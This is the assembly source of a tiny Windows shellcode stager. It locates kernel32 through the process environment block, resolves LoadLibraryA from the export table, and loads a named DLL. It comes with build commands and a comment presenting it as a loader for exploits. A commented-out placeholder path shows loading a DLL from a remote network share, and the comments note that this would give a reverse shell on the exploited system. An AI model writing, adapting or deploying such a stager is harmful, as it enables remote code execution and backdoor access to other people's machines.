comment ~

	This executes LoadLibraryA specifying "user32" as arguement.
	Observe the UNC (Universal Naming Convention) hint.

	When a DLL is loaded into memory, it is passed messages from
	the operating system, such as DLL_PROCESS_ATTACH & DLL_THREAD_ATTACH
	
	So, after the operating system loads a DLL into a process, the entry point of the DLL
	will be executed.
	Upside of this is that the DLL need not be in assembly.
	You may use HLL coded DLL, in C/C++/Java..etc
	
	Size of this code is currently 80 bytes.
	82 with extra jump, Get/SetThreadContext can sort this out from dll loaded into mem.
	So, its not needed, except for this example..

	It doesn't do anything useful at the moment..but
	You *could* have a stable reverse-shell, using loader like this under 100 bytes,
	providing you have netbios share accessable to system being exploited.
	
	The idea was suggested by Brett Moore on darklabs dec 03
	Its pretty much same, just smaller..bit more stable.
	
	TASM arguements.

	implib -c -f -o -i kernel32.lib %SYSTEMROOT%\system32\kernel32.dll
	tasm32 /dTASM /ml /m9 xdll.asm
	tlink32 /Tpe /aa /x xdll.obj,,,kernel32.lib
	
	MASM arguements.
	
	ml /DMASM /Cp /coff /c /Ic:\masm32\include xdll.asm
	link /SUBSYSTEM:WINDOWS /LIBPATH:c:\masm32\lib /SECTION:.text,W xdll.obj
	
	bcom@hushmail.com

~
.586
.model flat, stdcall

IFDEF MASM
include <kernel32.inc>
.code
ENDIF

IFDEF TASM
extrn	ExitProcess	:proc
.code
	ret
.data
ENDIF

	assume	fs:nothing

main:
	mov	eax, exit_point-entry_point	; currently 80 bytes + 2 (for jmp at end)
	;================================
entry_point:
	jmp	over_code
gdelta:
	pop	esi
	push	esi						; LoadLibraryA arguement
	inc	byte ptr [esi + nUNCLen]		; complete null terminated string

	push	30h
	pop	ecx
	mov	eax, fs:[ecx]			; Getting Process Infos - Ratter/29A Issue 6
	mov	eax, [eax + 0ch]
	mov	esi, [eax + 1ch]
	lodsd
	mov	ebx, [eax + 08h]
	;=====================
	mov	cl, 03h
	mov	eax, [ebx + 3ch]		; optional PE header (this is a word,dword saves space)
	mov	eax, [ebx + eax + 78h]		; export directory
	lea	esi, [ebx + eax + 1ch]		; offset API rva
load_rva:
	lodsd
	add	eax, ebx				; rva 2 va
	push	eax
	loop	load_rva
	pop	edx
	pop	esi
load_index:
	mov	edi, [esi + 4 * ecx]
	inc	ecx					; increase index
	cmp	dword ptr [ebx + edi], 'daoL'	; LoadLibraryA
	jne	load_index
	dec	ecx
	pop	esi
	movzx	eax, word ptr [edx + 2 * ecx]		; get API ordinal
	add	ebx, [esi + 4 * eax]			; add api rva to base
	call	ebx						; call api
	;==================================
	jmp	exit_point			; not really part of asm code, gotta go somewhere tho, right?
over_code:
	call	gdelta
szUNC:
	;db	"\\HOST\SHARE\DLL",0ffh		; unc hint, change this to your needs.
	db	"user32",0ffh
nUNCLen	equ	$-szUNC-1

exit_point:
	push	eax
	call	ExitProcess		; only here for test & because win2k/xp crash with no imports in PE file

end	main